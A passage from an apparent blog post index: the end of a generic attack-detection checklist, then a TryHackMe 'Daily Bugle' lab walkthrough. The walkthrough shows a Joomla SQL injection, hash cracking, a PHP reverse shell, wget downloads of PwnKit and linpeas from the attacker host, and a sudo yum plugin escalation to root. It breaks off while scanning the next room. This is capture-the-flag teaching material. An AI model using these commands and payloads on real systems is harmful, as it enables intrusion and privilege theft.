Response: Block identified malicious SMB activity and implement strong SMB usage policies. Detecting Remote File Copy:\nTechnique: Copying files remotely to facilitate lateral movement. Detection: Monitor for unusual file copy activity and use endpoint security solutions. Response: Block identified malicious file copy activity and implement strong file copy policies. Detecting Windows Management Instrumentation (WMI) Usage:\nTechnique: Using WMI to execute commands on remote systems. Detection: Monitor for unusual WMI activity and use endpoint security solutions. Response: Block identified malicious WMI activity and implement strong WMI usage policies. Detecting PowerShell Remoting:\nTechnique: Using PowerShell to execute commands on remote systems. Detection: Monitor for unusual PowerShell remoting activity and use endpoint security solutions. Response: Block identified malicious PowerShell remoting activity and implement strong PowerShell remoting policies. Detecting Pass-the-Hash Attacks:\nTechnique: Using stolen hash values to authenticate without knowing the actual password. Detection: Monitor for unusual authentication attempts and use endpoint security solutions. Response: Block identified pass-the-hash attempts and implement strong authentication policies. Detecting Pass-the-Ticket Attacks:\nTechnique: Using stolen Kerberos tickets to authenticate. Detection: Monitor for unusual Kerberos ticket activity and use endpoint security solutions. Response: Block identified pass-the-ticket attempts and implement strong authentication policies. Detecting Credential Reuse:\nTechnique: Using stolen credentials to gain unauthorized access. Detection: Monitor for unusual login attempts and use endpoint security solutions. Response: Block identified credential reuse attempts and implement strong authentication policies. 15. Collection # Detecting Data Staging:\nTechnique: Preparing data for exfiltration. Detection: Monitor for unusual data staging activity and use endpoint security solutions. Response: Block identified data staging attempts and implement strong data staging policies. Detecting Data Archiving:\nTechnique: Archiving data to facilitate exfiltration. Detection: Monitor for unusual data archiving activity and use endpoint security solutions. Response: Block identified data archiving attempts and implement strong data archiving policies. Detecting Data Compression:\nTechnique: Compressing data to facilitate exfiltration. Detection: Monitor for unusual data compression activity and use endpoint security solutions. Response: Block identified data compression attempts and implement strong data compression policies. Detecting Data Encryption:\nTechnique: Encrypting data to facilitate exfiltration. Detection: Monitor for unusual data encryption activity and use endpoint security solutions. Response: Block identified data encryption attempts and implement strong data encryption policies. Detecting Data Transfer:\nTechnique: Transferring data to a remote location to facilitate exfiltration. Detection: Monitor for unusual data transfer activity and use endpoint security solutions. Response: Block identified data transfer attempts and implement strong data transfer policies. Detecting Data Collection Tools:\nTechnique: Using tools to collect data for exfiltration. - Detection: Monitor for unusual data collection tool activity and use endpoint security solutions. - Response: Block identified data collection tools and implement strong data collection policies.\nDetecting Data Collection Scripts:\nTechnique: Using scripts to collect data for exfiltration. Detection: Monitor for unusual data collection script activity and use endpoint security solutions. Response: Block identified data collection scripts and implement strong data collection policies. Detecting Data Collection from Network Shares:\nTechnique: Collecting data from network shares for exfiltration. Detection: Monitor for unusual data collection from network shares activity and use endpoint security solutions. Response: Block identified data collection from network shares and implement strong data collection policies. 16. Exfiltration # Data Exfiltration via HTTP/HTTPS:\nTechnique: Using HTTP or HTTPS to exfiltrate data. Detection: Monitor for unusual HTTP/HTTPS traffic and use data loss prevention (DLP) solutions. Response: Block identified data exfiltration attempts and implement strong HTTP/HTTPS usage policies. Data Exfiltration via FTP:\nTechnique: Using FTP to exfiltrate data. Detection: Monitor for unusual FTP traffic and use data loss prevention (DLP) solutions. Response: Block identified data exfiltration attempts and implement strong FTP usage policies. Data Exfiltration via Email:\nTechnique: Using email to exfiltrate data. Detection: Monitor for unusual email activity and use data loss prevention (DLP) solutions. Response: Block identified data exfiltration attempts and implement strong email usage policies. Data Exfiltration via Removable Media:\nTechnique: Using removable media to exfiltrate data. Detection: Monitor for unusual removable media activity and use data loss prevention (DLP) solutions. Response: Block identified data exfiltration attempts and implement strong removable media usage policies. Data Exfiltration via Cloud Storage:\nTechnique: Using cloud storage to exfiltrate data. Detection: Monitor for unusual cloud storage activity and use data loss prevention (DLP) solutions. Response: Block identified data exfiltration attempts and implement strong cloud storage usage policies. Data Exfiltration via DNS:\nTechnique: Using DNS to exfiltrate data. Detection: Monitor for unusual DNS activity and use data loss prevention (DLP) solutions. Response: Block identified data exfiltration attempts and implement strong DNS usage policies. Data Exfiltration via P2P Networks:\nTechnique: Using peer-to-peer networks to exfiltrate data. Detection: Monitor for unusual P2P network activity and use data loss prevention (DLP) solutions. Response: Block identified data exfiltration attempts and implement strong P2P network usage policies. Data Exfiltration via Custom Protocols:\nTechnique: Using custom protocols to exfiltrate data. Detection: Monitor for unusual custom protocol activity and use data loss prevention (DLP) solutions. Response: Block identified data exfiltration attempts and implement strong custom protocol usage policies. 17. Impact # Detecting Data Destruction:\nTechnique: Destroying data to cause harm. Detection: Monitor for unusual data deletion activity and use endpoint security solutions. Response: Block identified data destruction attempts and implement strong data deletion policies. Detecting Data Corruption:\nTechnique: Corrupting data to cause harm. Detection: Monitor for unusual data corruption activity and use endpoint security solutions. Response: Block identified data corruption attempts and implement strong data corruption policies. Detecting Data Encryption for Ransom:\nTechnique: Encrypting data and demanding ransom for decryption. Detection: Monitor for unusual data encryption activity and use endpoint security solutions. Response: Block identified data encryption attempts and implement strong data encryption policies. Detecting Service Disruption:\nTechnique: Disrupting services to cause harm. Detection: Monitor for unusual service disruption activity and use endpoint security solutions. Response: Block identified service disruption attempts and implement strong service disruption policies. Detecting System Reboot:\nTechnique: Rebooting systems to cause disruption. Detection: Monitor for unusual system reboot activity and use endpoint security solutions. Response: Block identified system reboot attempts and implement strong system reboot policies. Detecting System Shutdown:\nTechnique: Shutting down systems to cause disruption. Detection: Monitor for unusual system shutdown activity and use endpoint security solutions. Response: Block identified system shutdown attempts and implement strong system shutdown policies. Detecting Service Sabotage:\nTechnique: Sabotaging services to cause harm. Detection: Monitor for unusual service sabotage activity and use endpoint security solutions. Response: Block identified service sabotage attempts and implement strong service sabotage policies. Detecting Financial Impact:\nTechnique: Causing financial harm through cyber attacks. Detection: Monitor for unusual financial activity and use endpoint security solutions. Response: Block identified financial impact attempts and implement strong financial security policies. 18. Objectives # Detecting Strategic Data Theft:\nTechnique: Stealing data to achieve strategic objectives. Detection: Monitor for unusual data access activity and use endpoint security solutions. Response: Block identified data theft attempts and implement strong data access policies. Detecting Intellectual Property Theft:\nTechnique: Stealing intellectual property to gain competitive advantage. Detection: Monitor for unusual data access activity and use endpoint security solutions. Response: Block identified intellectual property theft attempts and implement strong data access policies. Detecting Industrial Espionage:\nTechnique: Conducting espionage to gain industrial advantage. Detection: Monitor for unusual data access activity and use endpoint security solutions. Response: Block identified industrial espionage attempts and implement strong data access policies. Detecting Financial Theft:\nTechnique: Stealing financial data to gain monetary advantage. Detection: Monitor for unusual financial activity and use endpoint security solutions. Response: Block identified financial theft attempts and implement strong financial security policies. Detecting Political Espionage:\nTechnique: Conducting espionage to gain political advantage. Detection: Monitor for unusual data access activity and use endpoint security solutions. Response: Block identified political espionage attempts and implement strong data access policies. Detecting Military Espionage:\nTechnique: Conducting espionage to gain military advantage. Detection: Monitor for unusual data access activity and use endpoint security solutions. Response: Block identified military espionage attempts and implement strong data access policies. Detecting Personal Data Theft:\nTechnique: Stealing personal data to gain advantage. Detection: Monitor for unusual data access activity and use endpoint security solutions. Response: Block identified personal data theft attempts and implement strong data access policies. Detecting Trade Secret Theft:\nTechnique: Stealing trade secrets to gain competitive advantage. Detection: Monitor for unusual data access activity and use endpoint security solutions. Response: Block identified trade secret theft attempts and implement strong data access policies. "},{"id":7,"href":"/posts/DailyBugle/","title":"Daily Bugle","section":"Blog","content":" Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum.\nhttps://tryhackme.com/r/room/dailybugle\nScanning # Let\u0026rsquo;s begin by scanning the target.\nrustscan -a 10.10.59.64 -r 1-65535 --ulimit 5000 -- -sVC (root㉿kali)-[~/tryhackme] └─# rustscan -a 10.10.59.64 -r 1-65535 --ulimit 5000 -- -sVC .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-\u0026#39; `-\u0026#39;`-----\u0026#39;`----\u0026#39; `-\u0026#39; `----\u0026#39; `---\u0026#39; `-\u0026#39; `-\u0026#39;`-\u0026#39; `-\u0026#39; The Modern Day Port Scanner. ________________________________________ : http://discord.skerritt.blog : : https://github.com/RustScan/RustScan : -------------------------------------- 0day was here ♥ [~] The config file is expected to be at \u0026#34;/root/.rustscan.toml\u0026#34; [~] Automatically increasing ulimit value to 5000. Open 10.10.59.64:22 Open 10.10.59.64:80 Open 10.10.59.64:3306 [~] Starting Script(s) [\u0026gt;] Running script \u0026#34;nmap -vvv -p {{port}} {{ip}} -sVC\u0026#34; on ip 10.10.59.64 Depending on the complexity of the script, results may take some time to appear. [~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-19 23:05 EDT NSE: Loaded 155 scripts for scanning. NSE: Script Pre-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 23:05 Completed NSE at 23:05, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 23:05 Completed NSE at 23:05, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 23:05 Completed NSE at 23:05, 0.00s elapsed Initiating Ping Scan at 23:05 Scanning 10.10.59.64 [4 ports] Completed Ping Scan at 23:05, 0.12s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 23:05 Completed Parallel DNS resolution of 1 host. at 23:05, 0.06s elapsed DNS resolution of 1 IPs took 0.06s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0] Initiating SYN Stealth Scan at 23:05 Scanning 10.10.59.64 [3 ports] Discovered open port 22/tcp on 10.10.59.64 Discovered open port 80/tcp on 10.10.59.64 Discovered open port 3306/tcp on 10.10.59.64 Completed SYN Stealth Scan at 23:05, 0.13s elapsed (3 total ports) Initiating Service scan at 23:05 Scanning 3 services on 10.10.59.64 Completed Service scan at 23:06, 16.47s elapsed (3 services on 1 host) NSE: Script scanning 10.10.59.64. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 23:06 NSE Timing: About 98.57% done; ETC: 23:06 (0:00:00 remaining) NSE Timing: About 99.76% done; ETC: 23:07 (0:00:00 remaining) Completed NSE at 23:07, 67.89s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 23:07 Completed NSE at 23:07, 7.52s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 23:07 Completed NSE at 23:07, 0.00s elapsed Nmap scan report for 10.10.59.64 Host is up, received echo-reply ttl 61 (0.092s latency). Scanned at 2023-03-19 23:05:49 EDT for 92s PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 61 OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 68ed7b197fed14e618986dc58830aae9 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCbp89KqmXj7Xx84uhisjiT7pGPYepXVTr4MnPu1P4fnlWzevm6BjeQgDBnoRVhddsjHhI1k+xdnahjcv6kykfT3mSeljfy+jRc+2ejMB95oK2AGycavgOfF4FLPYtd5J97WqRmu2ZC2sQUvbGMUsrNaKLAVdWRIqO5OO07WIGtr3c2ZsM417TTcTsSh1Cjhx3F+gbgi0BbBAN3sQqySa91AFruPA+m0R9JnDX5rzXmhWwzAM1Y8R72c4XKXRXdQT9szyyEiEwaXyT0p6XiaaDyxT2WMXTZEBSUKOHUQiUhX7JjBaeVvuX4ITG+W8zpZ6uXUrUySytuzMXlPyfMBy8B | 256 5cd682dab219e33799fb96820870ee9d (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKb+wNoVp40Na4/Ycep7p++QQiOmDvP550H86ivDdM/7XF9mqOfdhWK0rrvkwq9EDZqibDZr3vL8MtwuMVV5Src= | 256 d2a975cf2f1ef5444f0b13c20fd737cc (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP4TcvlwCGpiawPyNCkuXTK5CCpat+Bv8LycyNdiTJHX 80/tcp open http syn-ack ttl 61 Apache httpd 2.4.6 ((CentOS) PHP/5.6.40) | http-robots.txt: 15 disallowed entries | /joomla/administrator/ /administrator/ /bin/ /cache/ | /cli/ /components/ /includes/ /installation/ /language/ |_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/ 3306/tcp open mysql syn-ack ttl 61 MariaDB (unauthorized) NSE: Script Post-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 23:07 Completed NSE at 23:07, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 23:07 Completed NSE at 23:07, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 23:07 Completed NSE at 23:07, 0.00s elapsed Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 92.57 seconds Raw packets sent: 7 (284B) | Rcvd: 4 (160B) Enumeration # We can see three open ports 22, 80 and 3306. There\u0026rsquo;s a website hosted on port 80, mysql service on port 3306 and SSH on port 22.\nLet\u0026rsquo;s navigate to the website that\u0026rsquo;s hosted on port 80. There\u0026rsquo;s Daily Bugle and it says that Spider-Man robs bank.\nFrom the scan results, we found that there are some disallowed entries in robots.txt. Let\u0026rsquo;s navigate to robots.txt and see if we can find any useful paths.\n# If the Joomla site is installed within a folder # eg www.example.com/joomla/ then the robots.txt file # MUST be moved to the site root # eg www.example.com/robots.txt # AND the joomla folder name MUST be prefixed to all of the # paths. # eg the Disallow rule for the /administrator/ folder MUST # be changed to read # Disallow: /joomla/administrator/ # # For more information about the robots.txt standard, see: # http://www.robotstxt.org/orig.html # # For syntax checking, see: # http://tool.motoricerca.info/robots-checker.phtml User-agent: * Disallow: /administrator/ Disallow: /bin/ Disallow: /cache/ Disallow: /cli/ Disallow: /components/ Disallow: /includes/ Disallow: /installation/ Disallow: /language/ Disallow: /layouts/ Disallow: /libraries/ Disallow: /logs/ Disallow: /modules/ Disallow: /plugins/ Disallow: /tmp/ The /administrator/ leads to a Joomla login page. Let\u0026rsquo;s try to find the version of Joomla.\nA simple google search gave the path /administrator/manifests/files/joomla.xml where the Joomla version can be found.\nhttps://www.zyxware.com/articles/5532/how-to-know-the-version-of-joomla-site-without-admin-access\nThis XML file does not appear to have any style information associated with it. The document tree is shown below. \u0026lt;extension version=\u0026#34;3.6\u0026#34; type=\u0026#34;file\u0026#34; method=\u0026#34;upgrade\u0026#34;\u0026gt; \u0026lt;name\u0026gt;files_joomla\u0026lt;/name\u0026gt; \u0026lt;author\u0026gt;Joomla! Project\u0026lt;/author\u0026gt; \u0026lt;authorEmail\u0026gt;admin@joomla.org\u0026lt;/authorEmail\u0026gt; \u0026lt;authorUrl\u0026gt;www.joomla.org\u0026lt;/authorUrl\u0026gt; \u0026lt;copyright\u0026gt; (C) 2005 - 2017 Open Source Matters. All rights reserved \u0026lt;/copyright\u0026gt; \u0026lt;license\u0026gt; GNU General Public License version 2 or later; see LICENSE.txt \u0026lt;/license\u0026gt; \u0026lt;version\u0026gt;3.7.0\u0026lt;/version\u0026gt; \u0026lt;creationDate\u0026gt;April 2017\u0026lt;/creationDate\u0026gt; \u0026lt;description\u0026gt;FILES_JOOMLA_XML_DESCRIPTION\u0026lt;/description\u0026gt; \u0026lt;scriptfile\u0026gt;administrator/components/com_admin/script.php\u0026lt;/scriptfile\u0026gt; \u0026lt;update\u0026gt; \u0026lt;schemas\u0026gt; \u0026lt;schemapath type=\u0026#34;mysql\u0026#34;\u0026gt; administrator/components/com_admin/sql/updates/mysql \u0026lt;/schemapath\u0026gt; \u0026lt;schemapath type=\u0026#34;sqlsrv\u0026#34;\u0026gt; administrator/components/com_admin/sql/updates/sqlazure \u0026lt;/schemapath\u0026gt; \u0026lt;schemapath type=\u0026#34;sqlazure\u0026#34;\u0026gt; administrator/components/com_admin/sql/updates/sqlazure \u0026lt;/schemapath\u0026gt; \u0026lt;schemapath type=\u0026#34;postgresql\u0026#34;\u0026gt; administrator/components/com_admin/sql/updates/postgresql \u0026lt;/schemapath\u0026gt; \u0026lt;/schemas\u0026gt; \u0026lt;/update\u0026gt; \u0026lt;fileset\u0026gt; \u0026lt;files\u0026gt; \u0026lt;folder\u0026gt;administrator\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;bin\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;cache\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;cli\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;components\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;images\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;includes\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;language\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;layouts\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;libraries\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;media\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;modules\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;plugins\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;templates\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;tmp\u0026lt;/folder\u0026gt; \u0026lt;file\u0026gt;htaccess.txt\u0026lt;/file\u0026gt; \u0026lt;file\u0026gt;web.config.txt\u0026lt;/file\u0026gt; \u0026lt;file\u0026gt;LICENSE.txt\u0026lt;/file\u0026gt; \u0026lt;file\u0026gt;README.txt\u0026lt;/file\u0026gt; \u0026lt;file\u0026gt;index.php\u0026lt;/file\u0026gt; \u0026lt;/files\u0026gt; \u0026lt;/fileset\u0026gt; \u0026lt;updateservers\u0026gt; \u0026lt;server name=\u0026#34;Joomla! Core\u0026#34; type=\u0026#34;collection\u0026#34;\u0026gt;https://update.joomla.org/core/list.xml\u0026lt;/server\u0026gt; \u0026lt;/updateservers\u0026gt; \u0026lt;/extension\u0026gt; Upon checking the vulnerabilities for the Joomla 3.7, there is an SQL Injection vulnerability present in Joomla 3.7.x before 3.7.1.\nhttps://www.cvedetails.com/cve/CVE-2017-8917/\nExploitation # There is a python code available to exploit this vulnerability.\nhttps://github.com/stefanlucas/Exploit-Joomla/blob/master/joomblah.py\n┌──(root㉿kali)-[~/tryhackme] └─# ./joomblah.py http://10.10.59.64/ .---. .-\u0026#39;\u0026#39;\u0026#39;-. .-\u0026#39;\u0026#39;\u0026#39;-. | | \u0026#39; _ \\ \u0026#39; _ \\ .---. \u0026#39;---\u0026#39; / /` \u0026#39;. \\ / /` \u0026#39;. \\ __ __ ___ /| | | . .---.. | \\ \u0026#39; . | \\ \u0026#39; | |/ `.\u0026#39; `. || | | .\u0026#39;| | || \u0026#39; | \u0026#39;| \u0026#39; | \u0026#39;| .-. .-. \u0026#39;|| | | \u0026lt; | | |\\ \\ / / \\ \\ / / | | | | | ||| __ | | __ | | | | `. ` ..\u0026#39; / `. ` ..\u0026#39; / | | | | | |||/\u0026#39;__ \u0026#39;. | | .:--.\u0026#39;. | | .\u0026#39;\u0026#39;\u0026#39;-. | | \u0026#39;-...-\u0026#39;` \u0026#39;-...-\u0026#39;` | | | | | ||:/` \u0026#39;. \u0026#39;| |/ | \\ | | |/.\u0026#39;\u0026#39;\u0026#39;. \\ | | | | | | | ||| | || |`\u0026#34; __ | | | / | | | | |__| |__| |__|||\\ / \u0026#39;| | .\u0026#39;.\u0026#39;\u0026#39;| | | | | | __.\u0026#39; \u0026#39; |/\u0026#39;..\u0026#39; / \u0026#39;---\u0026#39;/ / | |_| | | | | \u0026#39; \u0026#39; `\u0026#39;-\u0026#39;` \\ \\._,\\ \u0026#39;/| \u0026#39;. | \u0026#39;. |____.\u0026#39; `--\u0026#39; `\u0026#34; \u0026#39;---\u0026#39; \u0026#39;---\u0026#39; [-] Fetching CSRF token [-] Testing SQLi - Found table: fb9j5_users - Extracting users from fb9j5_users [$] Found user [\u0026#39;811\u0026#39;, \u0026#39;Super User\u0026#39;, \u0026#39;jonah\u0026#39;, \u0026#39;jonah@tryhackme.com\u0026#39;, \u0026#39;$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;\u0026#39;] - Extracting sessions from fb9j5_session We found a user jonah with a password hash. Let\u0026rsquo;s crack the hash using John The Ripper. It takes quite some time to crack the password.\n┌──(root㉿kali)-[~/tryhackme] └─# cat hash.txt $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm ┌──(root㉿kali)-[~/tryhackme] └─# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt Using default input encoding: UTF-8 Loaded 1 password hash (bcrypt [Blowfish 32/64 X2]) Cost 1 (iteration count) is 1024 for all loaded hashes Will run 3 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status spiderman123 (?) 1g 0:00:08:37 DONE (2023-03-20 01:18) 0.001933g/s 90.54p/s 90.54c/s 90.54C/s sweetsmile..speciala Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. Let\u0026rsquo;s login to Joomla using the credentials jonah and spiderman123.\nUpon navigating to the templates section and clicking on templates, we can see the templates that are being used. In each template, we can see some php files. Let\u0026rsquo;s try to get a php reverse shell using those. Navigate to index.php file in protostar template and replace the code with the following php code.\nhttps://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php\nMake sure to change the ip address in the php file.\nStart the netcat listener and navigate to main website that\u0026rsquo;s being hosted on port 80.\n┌──(root㉿kali)-[~/tools] └─# nc -lnvp 1234 listening on [any] 1234 ... connect to [10.6.10.164] from (UNKNOWN) [10.10.59.64] 48864 Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 01:46:50 up 34 min, 0 users, load average: 0.00, 0.01, 0.05 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=48(apache) gid=48(apache) groups=48(apache) sh: no job control in this shell sh-4.2$ We get a foothold on the machine.\nPrivilege Escalation # Method 1 # Use the PwnKit exploit to get root privileges.\nhttps://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit\nDownload the binary to host machine and serve it using python http web server. Then download the binary to the target machine\u0026rsquo;s /tmp directory, change the permissions to executable and run it.\npython -m http.server sh-4.2$ wget http://10.6.10.164:8000/PwnKit wget http://10.6.10.164:8000/PwnKit --2023-03-20 02:01:32-- http://10.6.10.164:8000/PwnKit Connecting to 10.6.10.164:8000... connected. HTTP request sent, awaiting response... 200 OK Length: 18040 (18K) [application/octet-stream] Saving to: \u0026#39;PwnKit\u0026#39; 100%[======================================\u0026gt;] 18,040 --.-K/s in 0.09s 2023-03-20 02:01:32 (189 KB/s) - \u0026#39;PwnKit\u0026#39; saved [18040/18040] sh-4.2$ chmod +x PwnKit chmod +x PwnKit sh-4.2$ ./PwnKit ./PwnKit [root@dailybugle tmp]# id id uid=0(root) gid=0(root) groups=0(root),48(apache) [root@dailybugle tmp]# We are root!!!\nMethod 2 # Download linpeas.sh to the target machine and run it.\nsh-4.2$ cd /tmp cd /tmp sh-4.2$ wget http://10.6.10.164:8000/linpeas.sh wget http://10.6.10.164:8000/linpeas.sh --2023-03-20 02:18:45-- http://10.6.10.164:8000/linpeas.sh Connecting to 10.6.10.164:8000... connected. HTTP request sent, awaiting response... 200 OK Length: 828172 (809K) [text/x-sh] Saving to: \u0026#39;linpeas.sh\u0026#39; 0K .......... .......... .......... .......... .......... 6% 260K 3s 50K .......... .......... .......... .......... .......... 12% 554K 2s 100K .......... .......... .......... .......... .......... 18% 2.42M 1s 150K .......... .......... .......... .......... .......... 24% 665K 1s 200K .......... .......... .......... .......... .......... 30% 1.76M 1s 250K .......... .......... .......... .......... .......... 37% 7.66M 1s 300K .......... .......... .......... .......... .......... 43% 7.49M 1s 350K .......... .......... .......... .......... .......... 49% 971K 0s 400K .......... .......... .......... .......... .......... 55% 3.86M 0s 450K .......... .......... .......... .......... .......... 61% 2.12M 0s 500K .......... .......... .......... .......... .......... 68% 9.80M 0s 550K .......... .......... .......... .......... .......... 74% 13.5M 0s 600K .......... .......... .......... .......... .......... 80% 3.34M 0s 650K .......... .......... .......... .......... .......... 86% 1.07M 0s 700K .......... .......... .......... .......... .......... 92% 8.62M 0s 750K .......... .......... .......... .......... .......... 98% 2.25M 0s 800K ........ 100% 65.8M=0.6s 2023-03-20 02:18:45 (1.31 MB/s) - \u0026#39;linpeas.sh\u0026#39; saved [828172/828172] sh-4.2$ chmod +x linpeas.sh chmod +x linpeas.sh sh-4.2$ ./linpeas.sh We found a public password in php config files.\n╔══════════╣ Searching passwords in config PHP files public $password = \u0026#39;nv5uz9r3ZEDzVjNu\u0026#39;; $this-\u0026gt;password = (empty($this-\u0026gt;options[\u0026#39;db_pass\u0026#39;])) ? \u0026#39;\u0026#39; : $this-\u0026gt;options[\u0026#39;db_pass\u0026#39;]; $this-\u0026gt;password = null; \u0026#39;password\u0026#39; =\u0026gt; $this-\u0026gt;password, Let\u0026rsquo;s try this password to switch the user from apache to jjameson.\nsh-4.2$ su jjameson su jjameson Password: nv5uz9r3ZEDzVjNu id uid=1000(jjameson) gid=1000(jjameson) groups=1000(jjameson) whoami jjameson It worked. We successfully changed to the user jjameson.\nNow, let\u0026rsquo;s see what binaries can be run using sudo.\nsudo -l Matching Defaults entries for jjameson on dailybugle: !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep=\u0026#34;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS\u0026#34;, env_keep+=\u0026#34;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE\u0026#34;, env_keep+=\u0026#34;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES\u0026#34;, env_keep+=\u0026#34;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE\u0026#34;, env_keep+=\u0026#34;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY\u0026#34;, secure_path=/sbin\\:/bin\\:/usr/sbin\\:/usr/bin User jjameson may run the following commands on dailybugle: (ALL) NOPASSWD: /usr/bin/yum The user jjameson can run the binary yum with root privileges.\nNavigate to GTFO bins.\nhttps://gtfobins.github.io/gtfobins/yum/#sudo\nWe can spawn an interactive root shell by loading a custom plugin as follows.\nid uid=1000(jjameson) gid=1000(jjameson) groups=1000(jjameson) whoami jjameson TF=$(mktemp -d) cat \u0026gt;$TF/x\u0026lt;\u0026lt;EOF [main] plugins=1 pluginpath=$TF pluginconfpath=$TF EOF cat \u0026gt;$TF/y.conf\u0026lt;\u0026lt;EOF [main] enabled=1 EOF cat \u0026gt;$TF/y.py\u0026lt;\u0026lt;EOF import os import yum from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE requires_api_version=\u0026#39;2.1\u0026#39; def init_hook(conduit): os.execl(\u0026#39;/bin/sh\u0026#39;,\u0026#39;/bin/sh\u0026#39;) EOF sudo yum -c $TF/x --enableplugin=y Loaded plugins: y No plugin match for: y id uid=0(root) gid=0(root) groups=0(root) whoami root We are root!!!\n"},{"id":8,"href":"/posts/SteelMountain/","title":"Steel Mountain","section":"Blog","content":" Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access.\nhttps://tryhackme.com/r/room/steelmountain\nScanning # Let\u0026rsquo;s begin by scanning the target. We will first scan the target using Rustscan.\n❯ rustscan -a 10.10.70.179 -- -sVC .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-\u0026#39; `-\u0026#39;`-----\u0026#39;`----\u0026#39; `-\u0026#39; `----\u0026#39; `---\u0026#39; `-\u0026#39; `-\u0026#39;`-\u0026#39; `-\u0026#39; The Modern Day Port Scanner. ________________________________________ : http://discord.skerritt.blog : : https://github.com/RustScan/RustScan : -------------------------------------- Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan [~] The config file is expected to be at \u0026#34;/root/.rustscan.toml\u0026#34; [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers [!] Your file limit is very small, which negatively impacts RustScan\u0026#39;s speed. Use the Docker image, or up the Ulimit with \u0026#39;--ulimit 5000\u0026#39;. Open 10.10.70.179:80 Open 10.10.70.179:135 Open 10.10.70.179:139 Open 10.10.70.179:445 Open 10.10.70.179:3389 Open 10.10.70.179:5985 Open 10.10.70.179:8080 Open 10.10.70.179:47001 Open 10.10.70.179:49156 Open 10.10.70.179:49153 Open 10.10.70.179:49155 Open 10.10.70.179:49170 Open 10.10.70.179:49169 Open 10.10.70.179:49154 Open 10.10.70.179:49152 [~] Starting Script(s) [\u0026gt;] Running script \u0026#34;nmap -vvv -p {{port}} {{ip}} -sVC\u0026#34; on ip 10.10.70.179 Depending on the complexity of the script, results may take some time to appear. [~] Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-23 22:58 EDT NSE: Loaded 155 scripts for scanning. NSE: Script Pre-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 22:58 Completed NSE at 22:58, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 22:58 Completed NSE at 22:58, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 22:58 Completed NSE at 22:58, 0.00s elapsed Initiating Ping Scan at 22:58 Scanning 10.10.70.179 [4 ports] Completed Ping 